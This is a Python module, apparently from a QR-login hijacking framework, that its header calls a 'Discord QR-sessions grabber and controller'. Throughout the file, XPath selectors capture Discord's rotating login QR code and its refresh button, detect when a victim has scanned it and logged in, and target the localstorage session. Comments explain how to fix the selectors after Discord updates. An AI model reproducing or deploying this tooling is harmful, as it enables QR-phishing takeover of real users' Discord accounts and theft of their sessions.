# -*- coding: utf-8 -*-
# Discord QR-session grabber
# Selectors based on Discord Web QR login DOM (2025)
from core.module_utils import types


class info:
    author = "Puneet Chandra Chaudhary - D0C70R"
    short_description = "Discord QR-sessions grabber and controller"
    full_description = None


class execution:
    module_type = types.grabber
    name = "discord"
    url = "https://discord.com/login"
    session_type = "localstorage"

    # =========================================================================
    # QR CODE IMAGE XPATHS
    # =========================================================================
    # Discord renders the QR code as a plain <img> tag inside the QR login
    # panel (not a <canvas> like WhatsApp).  The img src is a data URL that
    # Discord rotates every ~30 s.
    #
    # Strategy:
    #   1. img inside the dedicated QR code wrapper (most stable)
    #   2. aria-label / alt attribute match on the img
    #   3. Broad <img> inside the auth box (last resort)
    # =========================================================================

    # --- Primary: img inside the QR code container div ----------------------
    # Discord wraps the QR image in a div with class containing "qrCode"
    image_xpath = (
        '//img[contains(@src,"data:image/png") and '
        'ancestor::div[contains(@class,"qrCode")]]'
    )

    # --- Alt 1: any img whose src is a data-URI inside the auth wrapper -----
    image_xpath_alt1 = (
        '//div[contains(@class,"loginBox")]//img[starts-with(@src,"data:image")]'
    )

    # --- Alt 2: img with alt or aria-label suggesting QR --------------------
    image_xpath_alt2 = (
        '//img[contains(@alt,"QR") or contains(@alt,"qr") '
        'or contains(@aria-label,"QR")]'
    )

    # --- Alt 3: broadest catch – any data-URI img not inside a header -------
    image_xpath_alt3 = (
        '//img[starts-with(@src,"data:image") and not(ancestor::header) '
        "and not(ancestor::nav)]"
    )

    # --- Alt 4: SVG-based QR (Discord has tested SVG-rendered codes in beta) -
    image_xpath_alt4 = (
        '//svg[ancestor::div[contains(@class,"qrCode") or contains(@class,"qr")]]'
    )

    # =========================================================================
    # QR RELOAD / REFRESH BUTTON XPATHS
    # =========================================================================
    # Discord automatically rotates QR codes without a manual button, but
    # displays a "QR code expired" overlay with a refresh button on timeout.
    # Keep selectors for that overlay here.
    # =========================================================================

    img_reload_button = (
        '//button[contains(@class,"refreshQr") or contains(@class,"refresh")]'
    )
    img_reload_btn_alt = (
        '//button[contains(normalize-space(.),"Refresh") '
        'or contains(normalize-space(.),"refresh")]'
    )
    img_reload_btn_alt2 = (
        '//button[contains(@aria-label,"Refresh") or contains(@aria-label,"refresh")]'
    )
    img_reload_btn_alt3 = None  # No third fallback needed for Discord

    # =========================================================================
    # SESSION / LOGIN SUCCESS DETECTION XPATHS
    # =========================================================================
    # After the user scans the QR code Discord transitions to the main app.
    # We detect this by looking for elements that only appear post-login.
    #
    # Most reliable signal: the sidebar listing user servers / DMs.
    # Second signal: the home button or the user info panel at the bottom.
    # Third signal: the main chat text input.
    # =========================================================================

    # Primary: sidebar / guild nav – always present after login
    change_identifier = (
        '//nav[contains(@aria-label,"Servers") or contains(@aria-label,"servers")]'
    )

    # Alt 1: user info panel at bottom-left (shows username + discriminator)
    change_id_android = (
        '//section[contains(@aria-label,"User Controls") '
        'or contains(@aria-label,"user controls")]'
    )

    # Alt 2: the Home button (direct messages) that appears post-login
    change_id_ios = '//a[@aria-label="Direct Messages" or @aria-label="Home"]'

    # Alt 3: main message input (only visible inside a channel after login)
    change_id_alt = '//div[@role="textbox" and contains(@aria-label,"Message")]'

    # =========================================================================
    # SELECTOR MAINTENANCE NOTES
    # =========================================================================
    # If ALL selectors fail after a Discord update:
    #
    # 1. Open https://discord.com/login in your browser (not headless).
    # 2. Click "Log in with QR Code" to reveal the QR panel.
    # 3. Open DevTools → Elements and locate the QR <img>.
    # 4. Find the nearest ancestor with a class, id, or aria-* attribute.
    # 5. Update image_xpath accordingly.
    # 6. For session detection, inspect the sidebar after login and look for
    #    stable aria-label or role attributes.
    #
    # Known Discord Web DOM attributes (as of 2025):
    #   QR image:            img inside div.qrCode* / img[src^="data:image/png"]
    #   Auth wrapper:        div.loginBox* / div.authBox*
    #   Post-login sidebar:  nav[aria-label="Servers"]
    #   User info section:   section[aria-label="User Controls"]
    #   Home/DMs button:     a[aria-label="Direct Messages"]
    #   Message textbox:     div[role="textbox"]
    # =========================================================================
